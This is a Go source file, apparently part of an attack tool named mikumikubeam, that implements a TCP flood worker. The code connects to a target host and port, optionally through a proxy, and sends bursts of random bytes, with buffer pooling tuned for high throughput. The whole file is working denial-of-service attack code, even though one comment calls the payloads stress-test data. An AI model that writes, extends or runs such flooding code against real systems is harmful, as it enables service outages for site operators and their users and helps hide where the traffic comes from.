package tcp

import (
	"context"
	"math/rand"
	"sync"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

// bufPool reuses byte buffers to reduce GC pressure under high throughput.
var bufPool = sync.Pool{
	New: func() any {
		b := make([]byte, 512)
		return &b
	},
}

type floodWorker struct{}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	if host == "" || port <= 0 {
		return nil
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}
	conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Send log only if connection was successful and verbose is enabled
	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	// Write random bytes (packet-size or 512 default)
	size := params.PacketSize
	if size <= 0 {
		size = 512
	}

	// Get buffer from pool, resize if needed
	bufPtr := bufPool.Get().(*[]byte)
	buf := *bufPtr
	if len(buf) < size {
		buf = make([]byte, size)
	} else {
		buf = buf[:size]
	}
	defer func() {
		*bufPtr = buf[:cap(buf)]
		bufPool.Put(bufPtr)
	}()

	// math/rand is ~100x faster than crypto/rand for random fill data.
	// Security-grade randomness is unnecessary for stress test payloads.
	rand.Read(buf)
	_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	_, _ = conn.Write(buf)
	// Optionally send a few bursts
	bursts := minInt(3, 1+rand.Intn(3))
	for i := 0; i < bursts; i++ {
		rand.Read(buf)
		_, _ = conn.Write(buf)
	}
	return nil
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
